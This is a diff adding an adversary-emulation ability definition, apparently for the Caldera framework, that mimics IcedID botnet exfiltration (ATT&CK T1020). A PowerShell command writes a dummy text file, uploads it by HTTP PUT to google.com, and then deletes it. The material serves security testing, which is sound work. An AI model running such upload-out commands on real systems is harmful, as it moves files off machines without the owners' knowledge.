@@ -1,0 +1,25 @@
+---
+- id: 305c23215a4bf6184ed701b5ca1d1af7
+  name: IcedID Botnet HTTP PUT
+  description: 'Creates a text file
+
+    Tries to upload to a server via HTTP PUT method with ContentType Header
+
+    Deletes a created file'
+  tactic: exfiltration
+  technique:
+    attack_id: T1020
+    name: Automated Exfiltration
+  platforms:
+    windows:
+      psh:
+        command: $fileName = "C:\temp\T1020_exfilFile.txt"; $url = "https://google.com";
+          $file = New-Item -Force $fileName -Value "This is ART IcedID Botnet Exfil
+          Test"; $contentType = "application/octet-stream"; try {Invoke-WebRequest
+          -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}
+        payloads: []
+        cleanup: $fileName = "C:\temp\T1020_exfilFile.txt"; Remove-Item -Path $fileName
+          -ErrorAction Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
